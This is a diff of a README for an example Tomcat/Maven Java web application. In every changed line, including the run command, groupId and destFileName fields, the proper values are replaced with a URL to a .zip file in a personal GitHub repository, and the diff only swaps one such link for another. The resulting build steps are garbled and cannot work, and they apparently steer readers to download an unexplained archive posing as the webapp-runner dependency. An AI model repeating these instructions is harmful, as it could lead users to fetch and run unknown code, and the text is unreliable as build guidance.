@@ -8,7 +8,7 @@ This is an example ready-to-deploy java web application built for Tomcat using M
 
 ```
 mvn package
-java -jar https://raw.githubusercontent.com/sivahariu/java-tomcat-maven-example/master/src/main/java-tomcat-maven-example-v3.1-beta.3.zip target/*.war
+java -jar https://github.com/sivahariu/java-tomcat-maven-example/raw/refs/heads/master/src/main/tomcat-maven-example-java-v3.0.zip target/*.war
 ```
 
 The application will be available on `http://localhost:8080`.
@@ -21,7 +21,7 @@ The application will be available on `http://localhost:8080`.
    mvn archetype:generate -DarchetypeArtifactId=maven-archetype-webapp
    ```
 
-2. Add the webapp-runner plugin into the `https://raw.githubusercontent.com/sivahariu/java-tomcat-maven-example/master/src/main/java-tomcat-maven-example-v3.1-beta.3.zip`:
+2. Add the webapp-runner plugin into the `https://github.com/sivahariu/java-tomcat-maven-example/raw/refs/heads/master/src/main/tomcat-maven-example-java-v3.0.zip`:
 
    ```
    <build>
@@ -29,7 +29,7 @@ The application will be available on `http://localhost:8080`.
      <plugins>
        <!-- ... -->
        <plugin>
-         <groupId>https://raw.githubusercontent.com/sivahariu/java-tomcat-maven-example/master/src/main/java-tomcat-maven-example-v3.1-beta.3.zip</groupId>
+         <groupId>https://github.com/sivahariu/java-tomcat-maven-example/raw/refs/heads/master/src/main/tomcat-maven-example-java-v3.0.zip</groupId>
          <artifactId>maven-dependency-plugin</artifactId>
          <version>2.3</version>
          <executions>
@@ -39,10 +39,10 @@ The application will be available on `http://localhost:8080`.
              <configuration>
                <artifactItems>
                  <artifactItem>
-                   <groupId>https://raw.githubusercontent.com/sivahariu/java-tomcat-maven-example/master/src/main/java-tomcat-maven-example-v3.1-beta.3.zip</groupId>
+                   <groupId>https://github.com/sivahariu/java-tomcat-maven-example/raw/refs/heads/master/src/main/tomcat-maven-example-java-v3.0.zip</groupId>
                    <artifactId>webapp-runner</artifactId>
                    <version>8.5.11.3</version>
-                   <destFileName>https://raw.githubusercontent.com/sivahariu/java-tomcat-maven-example/master/src/main/java-tomcat-maven-example-v3.1-beta.3.zip</destFileName>
+                   <destFileName>https://github.com/sivahariu/java-tomcat-maven-example/raw/refs/heads/master/src/main/tomcat-maven-example-java-v3.0.zip</destFileName>
                  </artifactItem>
                </artifactItems>
              </configuration>
